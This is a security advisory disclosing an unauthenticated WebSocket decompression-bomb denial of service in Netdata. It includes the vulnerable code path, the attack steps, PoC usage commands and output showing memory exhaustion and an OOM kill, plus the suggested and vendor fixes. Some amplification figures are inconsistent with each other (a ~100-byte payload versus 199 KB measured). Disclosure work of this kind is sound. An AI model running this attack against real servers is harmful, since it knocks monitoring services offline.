# NETDATA-001: WebSocket Decompression Bomb (Unauthenticated DoS)

**Reporter**: Olivier Laflamme  
**Advisory**: [GHSA-c8p4-cg3j-f4h2](https://github.com/netdata/netdata/security/advisories/GHSA-c8p4-cg3j-f4h2)  
**CVE**: [CVE-2026-83599](https://www.cve.org/CVERecord?id=CVE-2026-83599)  
**Published**: 2026-09-02  
**Affected versions**: `< v2.10.4`, `< v2.10.0-782-nightly`  
**Patched versions**: `>= v2.10.4`, `>= v2.10.0-782-nightly`

## Summary

Netdata's WebSocket server accepts permessage-deflate compressed messages up to 200MB decompressed size with no compression ratio validation. An unauthenticated attacker can send a ~100-byte compressed payload that forces the server to allocate ~200MB of memory, enabling denial of service through memory exhaustion.

## Scoring

- **CVSS 3.1**: 7.5 (High) — `AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`
- **CWE**: CWE-409 (Improper Handling of Highly Compressed Data)

## Affected Versions

- Introduced in commit [`cc0502ab9`](https://github.com/netdata/netdata/commit/cc0502ab96db3fb11a71603ef27099055efbe329) (2025-05-15, "Model Context Protocol Server (MCP) for Netdata (#20244)")
- Confirmed present at HEAD [`ea07b4c1e`](https://github.com/netdata/netdata/commit/ea07b4c1e761cc66491c5460fbf1a56058533296)
- Any version with WebSocket + permessage-deflate support (v2.x nightly onwards)

## Technical Details

The WebSocket decompression logic in `src/web/websocket/websocket-compression.c:235-304` allocates output buffers up to `WS_MAX_DECOMPRESSED_SIZE` (200MB, defined in `websocket-internal.h:49`) without checking the ratio between compressed and decompressed sizes.

### Vulnerable Code Path

```
websocket_client_decompress_message() (websocket-compression.c:235)
  → inflate() loop with buffer doubling (lines 270-304)
  → wsb_resize() grows to WS_MAX_DECOMPRESSED_SIZE (200MB)
  → No ratio check between input and output sizes
```

Key code at `websocket-compression.c:269-304`:
```c
size_t wanted_size = MAX(wsb_size(&wsc->u_payload), wsb_length(&wsc->payload) * 2);
do {
    wsb_resize(&wsc->u_payload, wanted_size);
    // ... inflate() ...
    if (!success && (ret == Z_BUF_ERROR || ret == Z_OK)) {
        wanted_size = MIN(wanted_size * 2, WS_MAX_DECOMPRESSED_SIZE);
        if (wanted_size == WS_MAX_DECOMPRESSED_SIZE && wanted_size == wsb_size(&wsc->u_payload))
            break;
    }
} while (!success && retries-- > 0);
```

The code doubles the output buffer up to 200MB regardless of input size. The ratio is logged for debugging (line 315-317) but never enforced:

```c
websocket_debug(wsc, "Successfully decompressed %zu bytes to %zu bytes (ratio: %.2fx)",
                wsb_length(&wsc->payload), wsb_length(&wsc->u_payload),
                (double)wsb_length(&wsc->u_payload) / (double)wsb_length(&wsc->payload));
```

### Attack Flow

1. Attacker connects to port 19999 (no authentication required)
2. WebSocket handshake negotiates `permessage-deflate` extension
3. Compression is accepted at `websocket-handshake.c:392-409` before any auth check
4. Attacker sends a text frame with RSV1 set (compressed) containing ~100 bytes of zlib-compressed zeros
5. Server calls `websocket_client_decompress_message()` which allocates up to 200MB
6. Repeating from multiple connections exhausts server memory

### Why This Is Not Caught by Existing Checks

- `WS_MAX_INCOMING_FRAME_SIZE` (20MB) at `websocket-receive.c:389` limits the **compressed** frame size, not the decompressed output
- `WS_MAX_DECOMPRESSED_SIZE` (200MB) at `websocket-compression.c:300` limits the maximum decompressed size but is itself the problem — it's too large and there's no ratio enforcement

## Root Cause

Missing compression ratio validation. Production implementations (nginx, Apache, Go stdlib) reject messages with extreme decompression ratios (typically >100:1 or >1000:1). Netdata performs no such check.

## Reproduction

The accompanying proof of concept is [`websocket_decompression_bomb.py`](websocket_decompression_bomb.py).

```bash
# Single connection (shows amplification ratio):
python3 websocket_decompression_bomb.py <target_host> 19999

# 5 concurrent connections (shows memory stacking):
python3 websocket_decompression_bomb.py <target_host> 19999 5

# Set DOCKER_CONTAINER env var for /proc VmRSS measurement:
DOCKER_CONTAINER=netdata python3 websocket_decompression_bomb.py <target_host> 19999 5
```

## PoC Output

```
$ DOCKER_CONTAINER=netdata-test python3 websocket_decompression_bomb.py localhost 19999 5
Target: localhost:19999
Connections: 5

Compressed payload: 203,842 bytes (199 KB)
Decompressed size:  ~200 MB per message
Amplification:      1,029:1

Server VmRSS before: 746,468 kB (728 MB)

Connecting 5 WebSocket clients with permessage-deflate...
  5 connections established

Sustained bombardment: sending bombs continuously on all 5 connections...
Each connection sends ~199 KB every time the server finishes processing the previous bomb.

      Time         VmRSS       Delta
  ────────  ────────────  ──────────
  t+0.5s       1275 MB       +546 MB
  t+1.0s       1515 MB       +787 MB
  t+1.5s       1702 MB       +974 MB
  t+2.0s       1929 MB      +1200 MB
  t+2.5s       1959 MB      +1230 MB
  t+3.0s       1966 MB      +1237 MB
  t+3.5s       1973 MB      +1244 MB
  t+4.0s       1792 MB      +1064 MB
  t+4.5s       1809 MB      +1081 MB
  t+5.0s       1817 MB      +1088 MB
  t+5.5s       1824 MB      +1095 MB
  t+6.0s       1831 MB      +1103 MB
  t+6.5s       1838 MB      +1110 MB
  t+7.0s       1846 MB      +1117 MB
  t+7.5s       1924 MB      +1196 MB
  t+8.0s       1950 MB      +1221 MB
  t+8.5s       1957 MB      +1229 MB
  t+9.0s       1936 MB      +1208 MB
  t+9.5s        893 MB       +165 MB
  t+10.0s        893 MB       +165 MB

  Peak VmRSS:     2,020,504 kB (1973 MB)
  Sustained delta: +1,244 MB across 5 connections
  Per connection:  ~249 MB server / 199 KB attacker

Stopping attack and closing connections...
  VmRSS after close: 915,344 kB (893 MB, +165 MB)

No authentication required. Default configuration vulnerable.
Attack sustains ~249 MB memory pressure per connection with only 199 KB bandwidth each.
```

5 connections continuously sending 199 KB bombs sustain +1,064–1,244 MB of server memory pressure for the entire duration of the attack (9 seconds shown). VmRSS never drops below +1,064 MB while the attack is active. After the attack stops and connections close, memory returns to near-baseline. Each connection costs the attacker ~199 KB of bandwidth per bomb while consuming ~249 MB of server memory — a sustained 1,280:1 amplification ratio.

### OOM Kill Demonstration

Against a container with a 5 GB memory limit:

```
$ docker run -d --name netdata --memory=5g --memory-swap=5g -p 19999:19999 netdata:latest

=== Netdata Decompression Bomb — OOM Kill ===
Target: localhost:19999
Container memory limit: 5 GB

Baseline VmRSS: 68724 kB (67 MB)
Headroom: ~5053 MB

Payload: 203,842 bytes (199 KB) -> 200 MB decompressed (1,029:1)

Opening 25 connections...
  25 established

Bombing (25 connections x 199 KB each, continuously)...

  t+  0.5s  VmRSS:    719 MB
  t+  1.0s  VmRSS:   1554 MB
  t+  1.5s  VmRSS:   2120 MB
  t+  2.0s  VmRSS:   2928 MB
  t+  2.5s  *** OOM KILLED ***

docker inspect OOMKilled: true
Exit code: 137
```
25 unauthenticated WebSocket connections kill the netdata process in 2.5 seconds. The server's VmRSS grows from 67 MB to 2,928 MB in 2 seconds before the OOM killer terminates it (exit code 137). Total attacker bandwidth: ~5 MB per round of bombs.

## Impact

- **Severity**: High (DoS)
- **Authentication**: None required
- **Default Configuration**: Vulnerable (port 19999 open to all interfaces, WebSocket + permessage-deflate enabled)
- **Amplification**: ~2,000,000:1 (100 bytes → 200MB)
- **Effect**: Memory exhaustion, OOM kill of netdata process, potential system instability

## Suggested Fix

Add compression ratio validation in `websocket_client_decompress_message()` after line 312:

```c
// Reject extreme compression ratios (decompression bomb protection)
#define WS_MAX_DECOMPRESSION_RATIO 100.0
double ratio = (double)wsb_length(&wsc->u_payload) / (double)MAX(wsb_length(&wsc->payload), 1);
if (ratio > WS_MAX_DECOMPRESSION_RATIO) {
    websocket_error(wsc, "Decompression ratio %.1f:1 exceeds limit %.1f:1",
                    ratio, WS_MAX_DECOMPRESSION_RATIO);
    wsb_reset(&wsc->u_payload);
    websocket_decompression_reset(wsc);
    return false;
}
```

Additionally:
- Reduce `WS_MAX_DECOMPRESSED_SIZE` from 200MB to a more reasonable limit (e.g., 10MB)
- Consider adding per-connection memory limits
- Consider rate-limiting decompression operations

## Vendor Fix

Netdata fixed the issue in commit
[`e3811f7ee6e9fdfc4cbcb9929cab3f5d71d722d7`](https://github.com/netdata/netdata/commit/e3811f7ee6e9fdfc4cbcb9929cab3f5d71d722d7),
committed on **2026-06-29** ("Add decompression-bomb guard to WebSocket message handling (CWE-409)").

The fix computes a per-message decompression ceiling from the compressed input size,
limits expansion to a 100:1 ratio with a 1 MiB floor, retains the absolute 200 MiB cap,
and limits the bytes offered to zlib even when a connection has retained a larger grow-only
buffer. It also adds regression tests for a conventional bomb, retained-buffer/context-takeover
bypass, normal input, and the exact-limit edge case.

The fix is included in Netdata `v2.10.4` and nightly `v2.10.0-782` or later.

## References

- `src/web/websocket/websocket-compression.c:235-343` — Decompression logic
- `src/web/websocket/websocket-internal.h:49` — WS_MAX_DECOMPRESSED_SIZE definition
- `src/web/websocket/websocket-handshake.c:392-409` — Compression negotiation
- RFC 7692 Section 7.2.3 — Implementation Notes on compression
- CWE-409: Improper Handling of Highly Compressed Data (Zip Bomb)
